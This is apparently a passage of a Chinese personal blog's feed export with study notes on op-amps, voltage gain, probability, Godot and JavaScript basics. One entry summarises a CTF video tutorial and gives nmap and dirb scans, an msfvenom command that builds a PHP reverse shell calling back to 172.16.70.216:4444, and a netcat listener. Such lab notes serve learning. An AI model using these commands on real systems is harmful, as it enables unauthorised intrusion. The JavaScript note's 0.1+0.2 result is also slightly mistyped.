src="/../img/ope_amp_two_input_minus_each_other.png"></p><p>运算放大器会用这个差值来乘以一个非常大的数字，得到了一个结果:<br>$$<br>\Delta V \times k (a\ big\ num)&#x3D; result<br>$$<br>运算放大器输出的电压就会等于这个结果的值.</p><p>这意味着:</p><ul><li>如果 Vin+ &lt; Vin-, 结果为负数, 输出电压就为一个极大的负电压</li><li>如果 Vin+ &gt; Vin-, 结果为正数, 输出电压就为一个极大的正电压</li></ul><p>这里需要一个称为 negative feedback (负反馈) 的概念. 如:<br><img src="/../img/negative_feedback_of_ope_amp.png"></p><p>这两个电阻，使得产生的输出电压的一部分又加回到 “-“ 一端的输入端.</p><p>这时考虑: </p><p>若 “+” 输入端电压变得低于 “-“ 输入端电压，那么输出端的电压会下降，从输出端加回到 “-“ 输入端的电压就会下降，直到 “-“ 输入端几乎与 “+” 输入端恰好相等, 输出电压将停止下降.</p><p><img src="/../img/plug_terminal_lower_than_minus_terminal.png"></p><p>又假设 “+” 输入端的电压高于 “-“ 输入端, 这会使放大器将输出电压增大， 这同时会使 “-“ 输入端的电压增大，直到其等于 “+” 输入端的电压大小.</p><p><mark>总结,</mark> 负反馈的存在总是迫使运算放大器的两个输入端子始终处于几乎相同的电压值. 一旦运算放大器的两个输入端子的电压几乎达到相同的值，他们之间的差值就是一个非常小的数字，因此输出电压就会是这个非常小的数字乘以一个非常大的数字.</p><p>看这一个情况:<br><img src="/../img/current_flow_is_eauql.png"></p><p>由于电流不会流过放大器的输入端，流过第一个电阻的电流值一定和流过第二个电阻的相同. 每个电阻的压降等于 $RI$.</p><p>从这个图中:<br><img src="/../img/big_resistance_in_negative_feedback.png"></p><p>若 R2 是一个大电阻，那么 Vout 输出电压基本都会被这个大电阻分压. 因此 R2 的电压基本等于输出电压.<br>$$<br>\because I_{in} &#x3D; \frac{V_{in}}{R1} \newline<br>-V_{out} &#x3D; I_{in} R2 \newline<br>\therefore V_{output} &#x3D; - \frac{V_{in}}{R1} \times R2 &#x3D; - \frac{R2}{R1} V_{in}<br>$$</p><p>注意这里的输出电压为负的，因为输入电压 Input Voltage 是连接在 “-“ 输入端.</p><p>如果要让输出电压为正，则需要改变输入电压的位置到 “+” 输入端.<br><img src="/../img/make_output_voltage_positive_in_ope_amp.png"></p><p>此时:<br>$$<br>I &#x3D; \frac{V_{input}}{R_1} \newline<br>V_{output} &#x3D; I \times (R_1 + R_2) \newline<br>V_{output} &#x3D; (1 + \frac{R_2}{R_1}) \times V_{input}<br>$$</p><p>输出电压是所有输入电压的总和:<br><img src="/../img/output_voltages_is_the_sum_of_all_the_input_voltages_in_ope_amp.png"></p><h2 id="积分运算"><a href="#积分运算" class="headerlink" title="积分运算"></a>积分运算</h2><p>一个电阻和电容如下:<br><img src="/../img/integral_of_ope_amp.png"></p><blockquote><p>计算如下:</p></blockquote><p>$$<br>\frac{V_{input}}{R} &#x3D; I &#x3D; -C \times \frac{dV_{output}}{dt} \newline~<br>\newline<br>V_{output} &#x3D; - \frac{1}{RC} \int V_{input}dt<br>$$</p><h2 id="微分运算"><a href="#微分运算" class="headerlink" title="微分运算"></a>微分运算</h2><p>交换电阻和电容的位置:<br><img src="/../img/output_voltage_is_the_differential_of_the_input_voltage_ope_amp.png"></p><blockquote><p>计算如下:<br>$$<br>C \times \frac{dV_{input}}{dt} &#x3D; I &#x3D; - \frac{V_output}{R} \newline~<br>V_{output} &#x3D; - RC \times \frac{dV_{input}}{dt}<br>$$</p></blockquote><h2 id="充当缓冲器使用"><a href="#充当缓冲器使用" class="headerlink" title="充当缓冲器使用"></a>充当缓冲器使用</h2><p>这种情况下，输出电压恰好等于输入电压:<br><img src="/../img/output_voltage_equal_to_input_voltage_ope_amp.png"></p><h1 id="反向放大器"><a href="#反向放大器" class="headerlink" title="反向放大器"></a>反向放大器</h1><p>Inverting amplifier, 因为输出电压和输入电压符号相反，所以为 Inverting, 反向放大器.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是电压增益</title>
    <link href="/2022/11/25/%E4%BB%80%E4%B9%88%E6%98%AF%E7%94%B5%E5%8E%8B%E5%A2%9E%E7%9B%8A/"/>
    <url>/2022/11/25/%E4%BB%80%E4%B9%88%E6%98%AF%E7%94%B5%E5%8E%8B%E5%A2%9E%E7%9B%8A/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.eefocus.com/e/511580">参考</a></p><p>voltage gain, 电压增益，这个增和益都是增加的意思，所以可以理解为电压的放大倍数，但这个倍数不一定比一大，所以电压实际上可能会变小.</p><p>电压增益用来描述放大电路对输入信号的放大能力.</p><p>计算公式为:<br>$$<br>GAIN &#x3D; 20 \times \log_{10}\left\vert \frac{U_o}{U_i} \right\vert<br>$$</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nvim-中-perl-的-language-server-建立</title>
    <link href="/2022/11/25/nvim-%E4%B8%AD-perl-%E7%9A%84-language-server-%E5%BB%BA%E7%AB%8B/"/>
    <url>/2022/11/25/nvim-%E4%B8%AD-perl-%E7%9A%84-language-server-%E5%BB%BA%E7%AB%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://climatechangechat.com/setting_up_lsp_nvim-lspconfig_and_perl_in_neovim.html">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Nvim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF-B站教程</title>
    <link href="/2022/11/23/CTF-B%E7%AB%99%E6%95%99%E7%A8%8B/"/>
    <url>/2022/11/23/CTF-B%E7%AB%99%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV19S4y1S7o2/?p=3&spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考</a></p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="主机发现工具"><a href="#主机发现工具" class="headerlink" title="主机发现工具"></a>主机发现工具</h2><p>几个命令行工具: </p><ul><li><code>arp-scan</code></li><li><code>netdiscover</code></li><li><code>fping</code></li></ul><p>快速扫描局域网可以用: <code>arp-scan -l</code></p><h2 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h2><p>使用 <code>nmap</code> 命令, 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nmap -sS -sV -p- -v -T4 靶机IP<br></code></pre></td></tr></table></figure><p>参数:<br><img src="/../img/parameters_of_nmap.png"></p><p>3306 一般是 mysql 服务.</p><p>浏览器的 Wappalyzer 插件可以获得很多信息.</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>命令行工具:</p><ul><li><code>dirb</code></li><li><code>dirbuster</code></li></ul><p>如使用 <code>dirb</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ dirb + url<br></code></pre></td></tr></table></figure><h2 id="修改-root-密码"><a href="#修改-root-密码" class="headerlink" title="修改 root 密码"></a>修改 root 密码</h2><h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>如用 <code>msfvenom</code> 命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.70.216 LPORT=4444 -o Desctop/shell.php<br></code></pre></td></tr></table></figure><h2 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h2><p>使用 <code>netcat</code> 这个命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nc -nlvp 4444<br></code></pre></td></tr></table></figure><p>可以用 <code>whoami</code> 查看当前权限.</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要就是上传有害脚本让目标主机执行.</p><p>访问目标主机上的不存在页面，使其触发执行 404 的代码.</p><p>感觉需要了解现有的漏洞，然后查看目标主机上是否存在.</p><p>防御方法，避免常见及默认的路径名，用户名. 实时了解最新漏洞.</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>等可能概型的适用情况</title>
    <link href="/2022/11/23/%E7%AD%89%E5%8F%AF%E8%83%BD%E6%A6%82%E5%9E%8B%E7%9A%84%E9%80%82%E7%94%A8%E6%83%85%E5%86%B5/"/>
    <url>/2022/11/23/%E7%AD%89%E5%8F%AF%E8%83%BD%E6%A6%82%E5%9E%8B%E7%9A%84%E9%80%82%E7%94%A8%E6%83%85%E5%86%B5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/277108286/answer/392215203">参考</a></p><p>等可能概型需要满足两个条件:</p><ol><li>样本空间中的样本点有限</li><li>样本点出现的概率相同</li></ol>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Godot-对话系统-Notes</title>
    <link href="/2022/11/22/Godot-%E5%AF%B9%E8%AF%9D%E7%B3%BB%E7%BB%9F-Notes/"/>
    <url>/2022/11/22/Godot-%E5%AF%B9%E8%AF%9D%E7%B3%BB%E7%BB%9F-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1y64y127n5/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考</a></p><p><a href="https://bakudas.itch.io/generic-rpg-pack">素材</a></p>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript-高级程序设计-Notes</title>
    <link href="/2022/11/22/JavaScript-%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-Notes/"/>
    <url>/2022/11/22/JavaScript-%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第1章-什么是-JavaScript"><a href="#第1章-什么是-JavaScript" class="headerlink" title="第1章 什么是 JavaScript"></a>第1章 什么是 JavaScript</h1><h2 id="1-2-JavaScript-实现"><a href="#1-2-JavaScript-实现" class="headerlink" title="1.2 JavaScript 实现"></a>1.2 JavaScript 实现</h2><p>JavaScript 和 ECMAScript 基本上是同义词.</p><p>包括的部分:<br><img src="/../img/construct_of_JavaScript.png"></p><h3 id="1-2-1-ECMAScript"><a href="#1-2-1-ECMAScript" class="headerlink" title="1.2.1 ECMAScript"></a>1.2.1 ECMAScript</h3><p>ECMAScript 是 ECMA-262 定义的语言，并不局限于 Web 浏览器. 这门语言没有输入和输出之类的方法.</p><p>ECMAScript 只是对实现这个规范描述的所有方面的一门语言的称呼. 规范包括:</p><p><img src="/../img/rule_of_ECMAScript.png"></p><h3 id="1-2-2-DOM"><a href="#1-2-2-DOM" class="headerlink" title="1.2.2 DOM"></a>1.2.2 DOM</h3><p>DOM 是 Document Object Model，文档对象模型的简称. 是一个应用编程接口 (API), 用于在 HTML 中使用扩展的 XML.</p><p>DOM 通过创建表示文档的树，让开发者可以随心所欲控制网页的内容和结构:<br><img src="/../img/DOM_tree_structure.png"></p><p>DOM 并非只能通过 JavaScript 访问, 其他很多语言都实现了.</p><p>支持 DOM 对浏览器厂商极为重要.</p><h3 id="1-2-3-BOM"><a href="#1-2-3-BOM" class="headerlink" title="1.2.3 BOM"></a>1.2.3 BOM</h3><p>BOM 是 Browser Object Model 的缩写. 也是一个 API, 用于支持访问和操作浏览器的窗口.</p><h2 id="JavaScript-版本"><a href="#JavaScript-版本" class="headerlink" title="JavaScript 版本"></a>JavaScript 版本</h2><h1 id="第2章-HTML-中的-JavaScript"><a href="#第2章-HTML-中的-JavaScript" class="headerlink" title="第2章 HTML 中的 JavaScript"></a>第2章 HTML 中的 JavaScript</h1><h2 id="lt-script-gt-元素"><a href="#lt-script-gt-元素" class="headerlink" title="&lt;script&gt; 元素"></a><code>&lt;script&gt;</code> 元素</h2><p><code>&lt;script&gt;</code> 元素有八个属性:<br><img src="/../img/script_attributes1.png"><br><img src="/../img/script_attributes2.png"></p><p>两种使用 <code>&lt;script&gt;</code> 的方法:</p><ul><li>将代码放在 <code>&lt;script&gt;</code> 元素中 (在 <code>&lt;script&gt;</code> 元素中的代码被计算完成之前，页面的其他内容不会被加载，也不会被显示)</li><li>使用 <code>src</code> 属性来包含外部文件中的 JavaScript<br>如:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p>注意，外部 JavaScript 文件的扩展名是 <code>.js</code>, 这是不需要的，因为浏览器不会检查所包含 JavaScript 文件的扩展名.</p><p>使用了 <code>src</code> 属性的 <code>&lt;script&gt;</code> 元素不应该再在 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签中再包含其他 JavaScript 代码，不然行内代码会被忽略.</p><h3 id="2-11-标签位置"><a href="#2-11-标签位置" class="headerlink" title="2.11 标签位置"></a>2.11 标签位置</h3><p>现代 Web 应用程序通常将所有 JavaScript 引用放在 <code>&lt;body&gt;</code> 元素中页面内容后面:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Example HTML Page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example1.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example2.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-2-推迟执行脚本"><a href="#2-1-2-推迟执行脚本" class="headerlink" title="2.1.2  推迟执行脚本"></a>2.1.2  推迟执行脚本</h3><p>放在页面底部比较好. <code>defer</code> 属性可能会被忽略.</p><h3 id="2-1-3-异步执行脚本"><a href="#2-1-3-异步执行脚本" class="headerlink" title="2.1.3 异步执行脚本"></a>2.1.3 异步执行脚本</h3><p><code>async</code> 属性和 <code>defer</code> 类似. 两者都只适用于外部脚本.</p><p>标记为 <code>async</code> 的脚本并不能保证能按照它们出现的次序执行.</p><p><code>async</code> 属性告诉浏览器，不必等脚本下载和执行完后再加载页面, 同样也不必等到该异步脚本下载和执行后在加载其他脚本.</p><h3 id="2-1-4-动态加载脚本"><a href="#2-1-4-动态加载脚本" class="headerlink" title="2.1.4 动态加载脚本"></a>2.1.4 动态加载脚本</h3><p>向 DOM 中动态添加 <code>script</code> 元素同样可以加载指定的脚本.</p><h3 id="2-1-5-XHTML-中的变化"><a href="#2-1-5-XHTML-中的变化" class="headerlink" title="2.1.5 XHTML 中的变化"></a>2.1.5 XHTML 中的变化</h3><p>XHTML, Extensible HyperText Markup Language，可扩展超文本标记语言是将 HTML 作为 XML 的应用重新包装的结果.</p><p>在 XHTML 中使用 JavaScript 必须指定 <code>type</code> 属性且值为 <code>text/javascript</code>.</p><h3 id="2-1-6-废弃的语法"><a href="#2-1-6-废弃的语法" class="headerlink" title="2.1.6 废弃的语法"></a>2.1.6 废弃的语法</h3><h2 id="2-2-行内代码与外部文件"><a href="#2-2-行内代码与外部文件" class="headerlink" title="2.2 行内代码与外部文件"></a>2.2 行内代码与外部文件</h2><p>通常认为最佳实践是尽可能将 JavaScript 代码放到外部文件中.</p><h2 id="2-3-文档模式"><a href="#2-3-文档模式" class="headerlink" title="2.3 文档模式"></a>2.3 文档模式</h2><p>使用 <code>doctype</code> 切换文档模式.</p><p>三种文档模式:</p><ul><li>混杂模式 (quirks mode)</li><li>标准模式 (standards mode)</li><li>准标准模式 (almost standards mode)</li></ul><h2 id="2-4-lt-noscript-gt-元素"><a href="#2-4-lt-noscript-gt-元素" class="headerlink" title="2.4 &lt;noscript&gt; 元素"></a>2.4 <code>&lt;noscript&gt;</code> 元素</h2><h1 id="第3章-语言基础"><a href="#第3章-语言基础" class="headerlink" title="第3章 语言基础"></a>第3章 语言基础</h1><h2 id="3-1-语法"><a href="#3-1-语法" class="headerlink" title="3.1 语法"></a>3.1 语法</h2><h3 id="3-1-1-区分大小写"><a href="#3-1-1-区分大小写" class="headerlink" title="3.1.1 区分大小写"></a>3.1.1 区分大小写</h3><h3 id="3-1-2-标识符"><a href="#3-1-2-标识符" class="headerlink" title="3.1.2 标识符"></a>3.1.2 标识符</h3><h3 id="3-1-3-注释"><a href="#3-1-3-注释" class="headerlink" title="3.1.3 注释"></a>3.1.3 注释</h3><p>C 语言的注释.</p><h3 id="3-1-4-严格模式"><a href="#3-1-4-严格模式" class="headerlink" title="3.1.4 严格模式"></a>3.1.4 严格模式</h3><p>是一种解析和执行模型，将不规范写法抛出.</p><p>对整个脚本启用严格模式，在脚本开头加上一行:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-meta">&quot;use strict&quot;</span>;<br></code></pre></td></tr></table></figure><p>其为一条预处理指令.</p><p>也可以单独指定一个函数在严格模式下执行:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doSomething</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&quot;use strict&quot;</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-1-5-语句"><a href="#3-1-5-语句" class="headerlink" title="3.1.5 语句"></a>3.1.5 语句</h3><p>以分号结尾.</p><p>if 语句和 C 一样.</p><h2 id="3-2-关键字和保留字"><a href="#3-2-关键字和保留字" class="headerlink" title="3.2 关键字和保留字"></a>3.2 关键字和保留字</h2><p><img src="/../img/keywords_of_js.png"></p><h2 id="3-3-变量"><a href="#3-3-变量" class="headerlink" title="3.3 变量"></a>3.3 变量</h2><p>有三个关键字可以声明变量: <code>var</code>, <code>const</code> 和 <code>let</code>.</p><h3 id="3-3-1-var-关键字"><a href="#3-3-1-var-关键字" class="headerlink" title="3.3.1 var 关键字"></a>3.3.1 var 关键字</h3><p>不初始化的情况下，变量会保存一个特殊值 undefined.</p><h4 id="1-var-声明作用域"><a href="#1-var-声明作用域" class="headerlink" title="1. var 声明作用域"></a>1. var 声明作用域</h4><p>使用 <code>var</code> 操作符定义的变量会成为包含它的函数的局部变量.</p><p>省略 <code>var</code> 操作符定义全局变量，但不推荐这么做.</p><p>定义多个变量可以这样写:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> message = <span class="hljs-string">&quot;hi&quot;</span>,<br>    found = <span class="hljs-literal">false</span>, <br>    age = <span class="hljs-number">29</span>;<br></code></pre></td></tr></table></figure><h4 id="2-var-声明提升"><a href="#2-var-声明提升" class="headerlink" title="2. var 声明提升"></a>2. var 声明提升</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age);<br>    <span class="hljs-keyword">var</span> age = <span class="hljs-number">26</span>;<br>&#125;<br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>等价于:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> age;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age);<br>    age = <span class="hljs-number">26</span>;<br>&#125;<br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>因此，反复声明也不会报错.</p><h3 id="3-3-2-let-声明"><a href="#3-3-2-let-声明" class="headerlink" title="3.3.2 let 声明"></a>3.3.2 let 声明</h3><p><code>let</code> 声明的范围是块作用域, 而 <code>var</code> 声明的范围是函数作用域.</p><p>块作用域可以看作是函数作用域的子集.</p><p><code>let</code> 不能重复声明.</p><h4 id="1-暂时性死区"><a href="#1-暂时性死区" class="headerlink" title="1. 暂时性死区"></a>1. 暂时性死区</h4><p><code>let</code> 不会在作用域中被提升.</p><h4 id="4-for-循环中的-let-声明"><a href="#4-for-循环中的-let-声明" class="headerlink" title="4. for 循环中的 let 声明"></a>4. for 循环中的 let 声明</h4><p><code>for</code> 循环的语法同样和 C 中相同.</p><p>在 <code>let</code> 出现之前，<code>for</code> 循环定义的迭代变量会渗透到循环体外部.</p><h3 id="3-3-3-const-声明"><a href="#3-3-3-const-声明" class="headerlink" title="3.3.3 const 声明"></a>3.3.3 const 声明</h3><p>声明时必须初始化，常量. 作用域也是块.</p><h3 id="3-3-4-声明风格及最佳实践"><a href="#3-3-4-声明风格及最佳实践" class="headerlink" title="3.3.4 声明风格及最佳实践"></a>3.3.4 声明风格及最佳实践</h3><p>不使用 <code>var</code>.</p><p><code>const</code> 优先，<code>let</code> 次之.</p><h2 id="3-4-数据类型"><a href="#3-4-数据类型" class="headerlink" title="3.4 数据类型"></a>3.4 数据类型</h2><p>七种类型:</p><ul><li>Undefined</li><li>Null</li><li>Boolean </li><li>Number</li><li>String</li><li>Symbol</li><li>Object</li></ul><h3 id="3-4-1-typeof-操作符"><a href="#3-4-1-typeof-操作符" class="headerlink" title="3.4.1 typeof 操作符"></a>3.4.1 typeof 操作符</h3><p>返回类型，首字母小写. 参数是一个变量.</p><h3 id="3-4-2-Undefined-类型"><a href="#3-4-2-Undefined-类型" class="headerlink" title="3.4.2 Undefined 类型"></a>3.4.2 Undefined 类型</h3><p>该类型只有 <code>undefined</code> 这一个特殊值.</p><p>一般来说，永远不用显式地给某个变量设置 <code>undefined</code> 值.</p><p>对未声明和未初始化的变量使用 <code>typeof</code> 返回值都是 <code>undefined</code>. 因此，建议在声明变量时进行初始化，来区分未初始化和未声明.</p><p><code>undefined</code> 是一个假值.</p><h3 id="3-4-3-Null-类型"><a href="#3-4-3-Null-类型" class="headerlink" title="3.4.3 Null 类型"></a>3.4.3 Null 类型</h3><p>Null 类型同样只有 <code>null</code> 这一个特殊值，<code>null</code> 值表示一个空对象指针.</p><p>在定义将来要保存对象值的变量时，建议使用 <code>null</code> 来初始化.</p><p><code>undefined</code> 值是由 <code>null</code> 值派生而来的, 因此 ECMA-262 将它们定义为表面相等.</p><p><code>null</code> 也是一个假值.</p><h3 id="3-4-4-Boolean-类型"><a href="#3-4-4-Boolean-类型" class="headerlink" title="3.4.4 Boolean 类型"></a>3.4.4 Boolean 类型</h3><p>有两个字面值:</p><ul><li><code>true</code>, 和数值 1 不相等</li><li><code>false</code>, 和数值 0 不相等</li></ul><p>区分大小写, </p><p>转换函数 <code>Boolean()</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> message = <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-keyword">let</span> messageAsBoolean = <span class="hljs-title class_">Boolean</span>(message);<br></code></pre></td></tr></table></figure><p>几个转换函数:<br><img src="/../img/convert_type_function_in_javascript.png"></p><h3 id="3-4-5-Number-类型"><a href="#3-4-5-Number-类型" class="headerlink" title="3.4.5 Number 类型"></a>3.4.5 Number 类型</h3><p>Number 类型使用 IEEE 754 格式表示整数和浮点值.</p><p>十进制数直接写.</p><p>八进制第一个数字为 0.</p><p>十六进制前缀为 0x.</p><p>使用八进制和十六进制格式创建的数值在所有数学操作中都被视为十进制数值.</p><h4 id="1-浮点值"><a href="#1-浮点值" class="headerlink" title="1. 浮点值"></a>1. 浮点值</h4><p>因为存储浮点值使用的内存空间是存储整数值的两倍，所以 ECMAScript 总是倾向于把值转换为整数.</p><p>也就是说有些浮点值会被自动转换为整数.</p><p>浮点值可以用科学记数法表示:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> floatNum = <span class="hljs-number">3.125e7</span>;<br></code></pre></td></tr></table></figure><p><code>e</code> 可以为大写 <code>E</code>.</p><p>浮点值的精确度最高可达 17 位小数. 但不要用来比较. 0.1 加  0.2 不等于 0.3, 而是 0.300000000000000004.</p><h4 id="2-值的范围"><a href="#2-值的范围" class="headerlink" title="2.  值的范围"></a>2.  值的范围</h4><p>ECMAScript 可以表示的最小值保存在 <code>Number.MIN_VALUE</code> 中. </p><p>ECMAScript 可以表示的最大值保存在 <code>Number.MAX_VALUE</code> 中.</p><p>无法表示的负数将被表示为 <code>-Infinity</code>.</p><p>无法表示的正数将被表示为 <code>Infinity</code>.</p><p>判断是否有限大 <code>isFinite()</code>.</p><h4 id="3-NaN"><a href="#3-NaN" class="headerlink" title="3. NaN"></a>3. NaN</h4><p>NaN, Not a Number, 用于表示本来要返回数值操作失败了.</p><p>NaN 不等于 NaN.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">NaN</span> == <span class="hljs-title class_">NaN</span>); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>可以用 <code>isNaN()</code> 判断.</p><h4 id="4-数值转换"><a href="#4-数值转换" class="headerlink" title="4. 数值转换"></a>4. 数值转换</h4><p>将非数值转换为数值的 3 个函数:</p><ul><li><code>Number()</code></li><li><code>parseInt</code></li><li><code>parseFloat</code></li></ul><p>后两个用来处理字符串.</p><h3 id="3-4-5-String-类型"><a href="#3-4-5-String-类型" class="headerlink" title="3.4.5 String 类型"></a>3.4.5 String 类型</h3><p>可用双引号 <code>&quot;</code>, 单引号 <code>&#39;</code>, 反引号标示.</p><p>字符串的长度可以通过其 <code>length</code> 属性获取. (如果字符串中包含双字节字符，那么 length 属性返回的可能不准确.)</p><h4 id="2-字符串特点"><a href="#2-字符串特点" class="headerlink" title="2. 字符串特点"></a>2. 字符串特点</h4><p>不可改变 (即，一旦被创建后，其值就不能改变).</p><p>修改某个变量中的字符串值，必须先销毁原始的字符串. (销毁过程在后台自动运行)</p><h4 id="3-转换为字符串"><a href="#3-转换为字符串" class="headerlink" title="3. 转换为字符串"></a>3. 转换为字符串</h4><p>几乎所有值都有 <code>toString()</code> 方法.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> age = <span class="hljs-number">11</span>;<br><span class="hljs-keyword">let</span> ageAsString = age.<span class="hljs-title function_">toString</span>();<br><span class="hljs-keyword">let</span> found = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">let</span> foundString = found.<span class="hljs-title function_">toString</span>();<br></code></pre></td></tr></table></figure><p><code>null</code> 和 <code>undefined</code> 没有 <code>toString()</code> 方法.</p><p><code>toString()</code> 可接收一个参数表示底数 (输出那个进制):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> num = <span class="hljs-number">10</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>());  